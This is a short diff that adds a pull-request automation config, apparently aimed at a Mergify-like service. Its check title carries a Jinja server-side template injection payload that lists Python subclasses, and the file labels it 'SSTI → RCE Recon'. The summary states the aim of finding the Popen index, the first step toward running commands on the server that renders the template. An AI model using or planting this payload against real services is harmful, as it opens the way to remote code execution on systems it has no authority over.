@@ -1,0 +1,8 @@
+# SSTI → RCE Recon - Subclass dump
+pull_request_rules:
+  - name: ssti-rce
+    conditions: []
+    actions:
+      post_check:
+        title: "{{ ''.__class__.__mro__[1].__subclasses__() }}"
+        summary: "Subclass recon - find Popen index"
